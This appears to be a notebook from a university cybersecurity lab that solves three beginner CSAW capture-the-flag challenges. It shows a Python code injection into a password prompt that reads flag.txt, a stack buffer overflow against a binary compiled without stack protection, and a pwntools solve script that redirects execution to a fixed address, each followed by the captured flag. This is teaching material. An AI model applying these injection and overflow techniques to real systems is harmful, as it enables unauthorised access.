# %%
# !pip install pwntools
# Out:
# ...
#   Preparing metadata (setup.py) ... done
# ...
#    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 12.9/12.9 MB 92.1 MB/s eta 0:00:00
# ...
#    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.3/2.3 MB 75.8 MB/s eta 0:00:00
# ...
#    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 223.9/223.9 kB 14.3 MB/s eta 0:00:00
# ...
#    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 188.5/188.5 kB 14.8 MB/s eta 0:00:00
# ...
#    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 90.6/90.6 kB 7.0 MB/s eta 0:00:00
# ...
#    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 16.3/16.3 MB 82.7 MB/s eta 0:00:00
# ...
#    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 74.8/74.8 kB 6.1 MB/s eta 0:00:00
# ...
#    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 278.2/278.2 kB 21.8 MB/s eta 0:00:00
# ...
#    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 160.3/160.3 kB 11.9 MB/s eta 0:00:00
# ...
#    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.4/1.4 MB 59.7 MB/s eta 0:00:00
# ...
#    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 127.4/127.4 kB 10.2 MB/s eta 0:00:00
# ...

# %%
# !git clone https://github.com/ajn313/ML-CyberSec-2025-Lab2
# Out:
# Cloning into 'ML-CyberSec-2025-Lab2'...
# remote: Enumerating objects: 33, done.
# remote: Counting objects: 100% (33/33), done.
# remote: Compressing objects: 100% (31/31), done.
# remote: Total 33 (delta 5), reused 0 (delta 0), pack-reused 0 (from 0)
# Receiving objects: 100% (33/33), 11.97 KiB | 5.98 MiB/s, done.
# Resolving deltas: 100% (5/5), done.

# %%
# %cd /content/ML-CyberSec-2025-Lab2/my_first_pwnie/
# Out:
# /content/ML-CyberSec-2025-Lab2/my_first_pwnie

# %%
# !python3 my_first_pwnie.py
# Out:
# What's the password? open("flag.txt", 'r').read()
# You entered `csawctf{neigh______}`
# Yay! Correct! Congrats!

# %%
# %cd /content/ML-CyberSec-2025-Lab2/puffin/
# Out:
# /content/ML-CyberSec-2025-Lab2/puffin

# %%
# !gcc puffin.c -o puffin -fno-stack-protector
# Out:
# puffin.c: In function ‘main’:
# puffin.c:15:5: warning: ‘fgets’ writing 48 bytes into a region of size 32 overflows the destination [-Wstringop-overflow=]
#    15 |     fgets(buffer, 0x30, stdin);
#       |     ^~~~~~~~~~~~~~~~~~~~~~~~~~
# puffin.c:11:10: note: destination object ‘buffer’ of size 32
#    11 |     char buffer[0x20];
#       |          ^~~~~~
# In file included from puffin.c:1:
# /usr/include/stdio.h:592:14: note: in a call to function ‘fgets’ declared with attribute ‘access (write_only, 1, 2)’
#   592 | extern char *fgets (char *__restrict __s, int __n, FILE *__restrict __stream)
#       |              ^~~~~

# %%
# !./puffin
# Out:
# The penguins are watching: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA! I'm freakin' out!
# csawctf{m4ybe_i_sh0u1dve_co113c73d_mor3_rock5_7o_impr355_her....}

# %%
# !./puffin
# Out:
# The penguins are watching: csawctf{m4ybe_i_sh0u1dve_co113c73d_mor3_rock5_7o_impr355_her....}
# csawctf{m4ybe_i_sh0u1dve_co113c73d_mor3_rock5_7o_impr355_her....}

# %%
# %cd /content/ML-CyberSec-2025-Lab2/target practice/
# Out:
# /content/ML-CyberSec-2025-Lab2/target practice

# %%
# !gcc target_practice.c -o target_practice -no-pie -fno-stack-protector

# %%
import os
os.environ['PWNLIB_NOTERM'] = '1'

# %%
# !python3 solve.py
# Out:
# [*] '/content/ML-CyberSec-2025-Lab2/target practice/target_practice'
#     Arch:       amd64-64-little
#     RELRO:      Partial RELRO
#     Stack:      No canary found
#     NX:         NX enabled
#     PIE:        No PIE (0x400000)
#     SHSTK:      Enabled
#     IBT:        Enabled
#     Stripped:   No
# 0x4011b6

# %%
# !./target_practice
# Out:
# Aim carefully.... 0x4011b6
# csawctf{y0ure_a_m4s7er4im3r}
